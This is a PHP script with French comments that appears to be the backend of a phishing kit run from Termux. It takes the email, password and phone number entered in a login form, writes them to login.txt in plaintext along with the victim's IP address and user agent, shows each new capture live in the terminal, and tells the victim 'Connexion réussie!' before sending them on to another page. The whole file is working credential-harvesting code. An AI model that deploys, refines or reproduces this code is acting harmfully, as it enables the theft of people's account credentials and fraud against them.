<?php
// Configuration
$logFile = "login.txt";
$realTimeLog = true; // Activer l'affichage temps réel dans Termux

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupération des données
    $email = htmlspecialchars(trim($_POST["email"] ?? ''));
    $password = htmlspecialchars(trim($_POST["password"] ?? ''));
    $country_code = htmlspecialchars(trim($_POST["country_code"] ?? ''));
    $phone = htmlspecialchars(trim($_POST["phone"] ?? ''));
    $ip = $_SERVER['REMOTE_ADDR'];
    $date = date('Y-m-d H:i:s');
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    // Validation des données
    if (empty($email) || empty($password)) {
        die("Erreur : Email et mot de passe requis");
    }

    // Formatage des données
    $logEntry = "======= NOUVELLE CONNEXION =======\n";
    $logEntry .= "Date: $date\n";
    $logEntry .= "IP: $ip\n";
    $logEntry .= "User Agent: $userAgent\n";
    $logEntry .= "Email: $email\n";
    $logEntry .= "Téléphone: $country_code $phone\n";
    $logEntry .= "Mot de passe: $password\n";
    $logEntry .= "================================\n\n";

    // Enregistrement dans le fichier
    try {
        // Création du fichier si inexistant
        if (!file_exists($logFile)) {
            file_put_contents($logFile, "");
            chmod($logFile, 0644);
        }

        // Écriture sécurisée
        if (file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX) === false) {
            throw new Exception("Erreur d'écriture dans le fichier");
        }

        // Affichage temps réel dans Termux
        if ($realTimeLog && php_sapi_name() === 'cli') {
            echo "\n\033[32m[NOUVEAU LOG]\033[0m\n";
            echo $logEntry;
        }

        // Réponse à l'utilisateur
        echo "Connexion réussie! Redirection en cours...";
        header("Refresh: 3; url=mer.html");
        
    } catch (Exception $e) {
        error_log("Erreur: " . $e->getMessage());
        echo "Une erreur est survenue. Veuillez réessayer.";
    }
} else {
    http_response_code(403);
    echo "Accès interdit";
}
?>
